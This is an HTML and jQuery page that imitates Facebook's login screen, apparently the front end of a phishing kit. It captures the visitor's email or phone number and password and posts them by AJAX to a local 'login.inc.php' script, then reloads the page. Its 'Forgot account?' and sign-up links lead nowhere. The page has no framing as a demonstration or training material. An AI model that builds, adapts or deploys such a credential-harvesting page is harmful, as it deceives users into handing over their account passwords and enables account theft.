<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="css/main.css">
</head>
<body style="background-color:#e9ebee">
	<div class="dsdsds text-center"> 
		<div class="center border login-form">
			<h3 class="text-center margin-bottom" style="color:#444">Log Into Facebook</h3> <br>

			<form id="formcontrol" method="post" autocomplete="off">

				<input type="text" required id="userPhone" class="inputCustom focus-border-blue round-2 border border" placeholder="Email or Phone Number" name="emPhone">

				<input type="password" required id="password" class="inputCustom focus-border-blue round-2 border border" placeholder="Password" name="password">
			<button class="round-2 login-btn">Log In</button> <br><br>
			</form>

			<a href="#"><label class="qwwqw">Forgot account?</label></a> <span class="margin-left margin-right"></span> <a href="#"><label class="qwwqw">Sign up for Facebook</label></a>
		</div>
	</div>
</body>
</html>
<script src="jquery.js"></script>
<script>
	$(document).ready(function(){
		$("#formcontrol").submit(function(e){
			e.preventDefault();

			var username = $("#userPhone").val();
			var password = $("#password").val();

			$.ajax({
				url:"login.inc.php",
				type:"POST",
				data:{
					username: username,
					password: password
				},
				success: function (data) {
					if (data) {
						location.reload();
					}
				}
			});
		});
	});
</script>